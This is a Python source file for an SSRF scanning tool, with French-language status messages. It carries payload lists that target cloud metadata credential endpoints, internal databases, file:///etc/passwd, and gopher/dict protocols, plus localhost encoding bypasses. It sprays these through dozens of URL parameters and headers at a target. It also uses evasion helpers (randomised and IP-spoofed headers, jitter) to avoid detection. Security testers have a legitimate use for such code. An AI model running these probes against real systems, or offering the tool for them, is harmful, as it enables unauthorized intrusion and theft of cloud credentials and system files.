"""
SSRF (Server-Side Request Forgery) Scanner - UHQKYRA v1.0
===========================================================
⚠️  Authorized security testing only.

Detects SSRF vulnerabilities:
  1. Parameter-based SSRF (url=, path=, redirect=, proxy=, etc.)
  2. Header-based SSRF (Referer, X-Forwarded-Host, Host injection)
  3. DNS rebinding indicators
  4. Internal network probing (metadata APIs, localhost)
  5. Blind SSRF via response-time analysis
  6. Protocol-based SSRF (file://, dict://, gopher://, ftp://)
"""
import re
import time
import warnings
warnings.filterwarnings("ignore")

try:
    import requests
    requests.packages.urllib3.disable_warnings()
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False

try:
    from modules.evasion import random_headers, burst_jitter
except ImportError:
    try:
        from evasion import random_headers, burst_jitter
    except ImportError:
        def random_headers(**kw): return {"User-Agent": "Mozilla/5.0"}
        def burst_jitter(): pass

# ── SSRF probe targets ────────────────────────────────────────────────────────

# Cloud metadata endpoints
CLOUD_METADATA = [
    "http://169.254.169.254/latest/meta-data/",           # AWS
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://metadata.google.internal/computeMetadata/v1/",  # GCP
    "http://169.254.169.254/metadata/v1/",                 # DigitalOcean
    "http://100.100.100.200/latest/meta-data/",            # Alibaba Cloud
    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",  # Azure
]

# Internal network targets
INTERNAL_TARGETS = [
    "http://127.0.0.1/",
    "http://localhost/",
    "http://0.0.0.0/",
    "http://[::1]/",
    "http://127.0.0.1:80/",
    "http://127.0.0.1:8080/",
    "http://127.0.0.1:8443/",
    "http://127.0.0.1:9200/",   # Elasticsearch
    "http://127.0.0.1:6379/",   # Redis
    "http://127.0.0.1:3306/",   # MySQL
    "http://127.0.0.1:5432/",   # PostgreSQL
    "http://127.0.0.1:27017/",  # MongoDB
    "http://192.168.0.1/",
    "http://10.0.0.1/",
    "http://172.16.0.1/",
]

# Protocols for protocol-based SSRF
PROTO_PAYLOADS = [
    "file:///etc/passwd",
    "file:///c:/windows/win.ini",
    "dict://127.0.0.1:6379/info",
    "gopher://127.0.0.1:6379/_INFO",
    "ftp://127.0.0.1/",
    "sftp://127.0.0.1/",
    "ldap://127.0.0.1/",
    "tftp://127.0.0.1/",
]

# Common SSRF parameter names
SSRF_PARAMS = [
    "url", "uri", "path", "target", "dest", "destination", "to",
    "redirect", "redirectUrl", "redirect_url", "redirectTo",
    "return", "returnUrl", "return_url", "returnTo",
    "next", "nextUrl", "next_url", "continue",
    "proxy", "proxyUrl", "proxy_url", "forward",
    "fetch", "request", "resource",
    "load", "open", "file", "src", "source",
    "image", "imageUrl", "image_url",
    "link", "href", "ref", "referrer",
    "host", "hostname", "domain", "site",
    "callback", "webhook", "wh", "hook",
    "endpoint", "service", "server",
    "out", "output", "import", "export",
    "data", "content", "body",
    "api", "apiUrl", "api_url",
    "backend", "remote", "external",
]

# Encoding bypasses for 127.0.0.1
LOCALHOST_BYPASSES = [
    "127.0.0.1",
    "localhost",
    "0.0.0.0",
    "0",
    "127.1",
    "127.0.1",
    "0x7f000001",      # hex
    "2130706433",      # decimal
    "0177.0.0.01",     # octal
    "127.000.000.001",
    "[::1]",
    "[0:0:0:0:0:ffff:127.0.0.1]",
    "①②⑦.⓪.⓪.①",   # unicode
    "127.0.0.1.nip.io",
    "localtest.me",
]

# Indicators of successful SSRF
SSRF_INDICATORS = [
    "ami-id", "instance-id", "security-credentials",  # AWS
    "computeMetadata", "serviceAccounts",              # GCP
    "REDIS", "redis_version",                          # Redis
    "root:x:0:0",                                      # /etc/passwd
    "bin/bash", "bin/sh",                              # /etc/passwd
    "[boot loader]", "[operating systems]",            # win.ini
    "mysql", "MySQL server", "database",               # DB responses
    "ES_HOME", "elasticsearch",                        # Elasticsearch
    "mongod", "mongodb",                               # MongoDB
    "PostgreSQL",                                      # PostgreSQL
]


def _req(session, method, url, **kwargs):
    """Request with stealth headers."""
    hdrs = random_headers(include_ip_spoof=True)
    hdrs.update(kwargs.pop("headers", {}))
    burst_jitter()
    try:
        fn = getattr(session, method.lower(), session.get)
        return fn(url, headers=hdrs, timeout=8, verify=False,
                  allow_redirects=False, **kwargs)
    except Exception:
        return None


def _has_ssrf_indicator(text):
    """Check response for SSRF success indicators."""
    text_lower = text.lower()
    for ind in SSRF_INDICATORS:
        if ind.lower() in text_lower:
            return ind
    return None


def scan_ssrf(url, callback=None):
    """
    Scan for SSRF vulnerabilities in URL parameters.
    """
    def cb(t, m):
        if callback:
            callback({"type": t, "message": m})

    results = {
        "url":             url,
        "findings":        [],
        "vulnerabilities": [],
        "tests_run":       0,
        "vulnerable":      False,
    }

    if not HAS_REQUESTS:
        cb("warn", "⚠️ requests non disponible")
        return results

    base = (url if "://" in url else "http://" + url).rstrip("/")
    cb("info", f"🌐 SSRF Scanner: {base}")

    import urllib.parse
    parsed = urllib.parse.urlparse(base)
    params = dict(urllib.parse.parse_qsl(parsed.query))

    session = requests.Session()
    session.verify = False

    # ── 1. Discover SSRF-prone parameters ─────────────────────────────
    cb("info", "🌐 Détection des paramètres SSRF...")
    target_params = list(params.keys()) if params else []
    # Also test common SSRF param names even if not in URL
    for p in SSRF_PARAMS:
        if p not in target_params:
            target_params.append(p)

    # ── 2. Test internal network probing ──────────────────────────────
    cb("info", "🌐 Test accès réseau interne...")
    for param in target_params[:15]:
        for internal in INTERNAL_TARGETS[:6]:
            results["tests_run"] += 1
            test_params = dict(params)
            test_params[param] = internal

            # Reconstruct URL
            test_url = urllib.parse.urlunparse(
                parsed._replace(query=urllib.parse.urlencode(test_params))
            )
            if not params:
                # Try as GET param
                test_url = base + f"?{param}={urllib.parse.quote(internal, safe='')}"

            r = _req(session, "GET", test_url)
            if r and r.status_code == 200 and len(r.text) > 20:
                indicator = _has_ssrf_indicator(r.text)
                if indicator or r.status_code == 200:
                    sev = "critical" if indicator else "medium"
                    detail = f"SSRF: param '{param}'={internal} → {r.status_code} ({len(r.text)}B)"
                    if indicator:
                        detail += f" [indicator: {indicator}]"
                    results["findings"].append({
                        "test": "internal_ssrf", "severity": sev,
                        "detail": detail, "url": test_url,
                        "param": param, "payload": internal,
                    })
                    if indicator:
                        results["vulnerable"] = True
                        results["vulnerabilities"].append({
                            "type": "ssrf", "severity": "critical",
                            "name": f"SSRF confirmé: {param} → réseau interne",
                            "detail": detail,
                        })
                        cb("vuln", f"🚨 SSRF CRITIQUE: {param}={internal} → {r.status_code} [{indicator}]")
                    else:
                        cb("found", f"🌐 SSRF possible: {param}={internal} → {r.status_code}")
                    break

    # ── 3. Cloud metadata probing ──────────────────────────────────────
    cb("info", "🌐 Test metadata cloud (AWS/GCP/Azure)...")
    for param in target_params[:5]:
        for meta_url in CLOUD_METADATA[:3]:
            results["tests_run"] += 1
            test_params = dict(params)
            test_params[param] = meta_url
            test_url = base + f"?{param}={urllib.parse.quote(meta_url, safe='')}"

            r = _req(session, "GET", test_url)
            if r and r.status_code == 200:
                indicator = _has_ssrf_indicator(r.text)
                if indicator:
                    results["vulnerable"] = True
                    detail = f"SSRF Cloud Metadata: {param}={meta_url[:50]} [{indicator}]"
                    results["findings"].append({
                        "test": "cloud_metadata_ssrf", "severity": "critical",
                        "detail": detail, "url": test_url,
                    })
                    results["vulnerabilities"].append({
                        "type": "ssrf_cloud", "severity": "critical",
                        "name": "SSRF: Cloud Metadata exposée",
                        "detail": detail,
                    })
                    cb("vuln", f"🚨 SSRF CRITIQUE: Cloud metadata via {param}")

    # ── 4. Protocol-based SSRF ────────────────────────────────────────
    cb("info", "🌐 Test SSRF par protocole (file://, dict://, gopher://)...")
    for param in target_params[:5]:
        for proto_payload in PROTO_PAYLOADS[:4]:
            results["tests_run"] += 1
            test_url = base + f"?{param}={urllib.parse.quote(proto_payload, safe='')}"

            r = _req(session, "GET", test_url)
            if r and r.status_code == 200 and len(r.text) > 20:
                indicator = _has_ssrf_indicator(r.text)
                if indicator or "root" in r.text or "bin" in r.text:
                    results["vulnerable"] = True
                    detail = f"Proto SSRF: {param}={proto_payload} → {len(r.text)}B"
                    results["findings"].append({
                        "test": "proto_ssrf", "severity": "critical",
                        "detail": detail, "url": test_url,
                    })
                    results["vulnerabilities"].append({
                        "type": "ssrf_protocol", "severity": "critical",
                        "name": f"SSRF Protocol Bypass: {proto_payload.split('://')[0]}://",
                        "detail": detail,
                    })
                    cb("vuln", f"🚨 SSRF Proto: {proto_payload} → {r.status_code}")

    # ── 5. Localhost bypass variants ──────────────────────────────────
    cb("info", "🌐 Test bypass localhost (hex, octal, unicode)...")
    for param in target_params[:3]:
        for bypass in LOCALHOST_BYPASSES[:8]:
            bypass_url = f"http://{bypass}/"
            results["tests_run"] += 1
            test_url = base + f"?{param}={urllib.parse.quote(bypass_url, safe='')}"

            r = _req(session, "GET", test_url)
            if r and r.status_code in (200, 301, 302):
                results["findings"].append({
                    "test": "localhost_bypass", "severity": "high",
                    "detail": f"Localhost bypass: {param}={bypass_url} → {r.status_code}",
                    "url": test_url,
                })
                cb("found", f"🌐 Localhost bypass possible: {bypass}")

    # ── 6. Header-based SSRF (Host, X-Forwarded-Host) ─────────────────
    cb("info", "🌐 Test header-based SSRF...")
    ssrf_headers_tests = [
        {"X-Forwarded-Host": "127.0.0.1"},
        {"X-Forwarded-Host": "169.254.169.254"},
        {"X-Host": "127.0.0.1"},
        {"X-Rewrite-URL": "http://127.0.0.1/"},
        {"X-Custom-IP-Authorization": "127.0.0.1"},
    ]
    for hdr_set in ssrf_headers_tests:
        results["tests_run"] += 1
        r = _req(session, "GET", base, headers=hdr_set)
        if r and r.status_code == 200:
            indicator = _has_ssrf_indicator(r.text)
            if indicator:
                results["vulnerable"] = True
                hdr_name = list(hdr_set.keys())[0]
                results["findings"].append({
                    "test": "header_ssrf", "severity": "critical",
                    "detail": f"Header SSRF: {hdr_name} → {r.status_code} [{indicator}]",
                })
                results["vulnerabilities"].append({
                    "type": "ssrf_header", "severity": "critical",
                    "name": f"Header SSRF: {hdr_name}",
                    "detail": f"{r.status_code} — indicateur: {indicator}",
                })
                cb("vuln", f"🚨 Header SSRF: {hdr_name}")

    # ── Summary ───────────────────────────────────────────────────────
    total_vulns = len([f for f in results["findings"]
                       if f.get("severity") in ("critical", "high")])
    if total_vulns:
        cb("vuln", f"🚨 SSRF: {total_vulns} vulnérabilité(s) sur {results['tests_run']} tests")
    else:
        cb("ok", f"🌐 SSRF: aucune vulnérabilité détectée ({results['tests_run']} tests)")

    return results
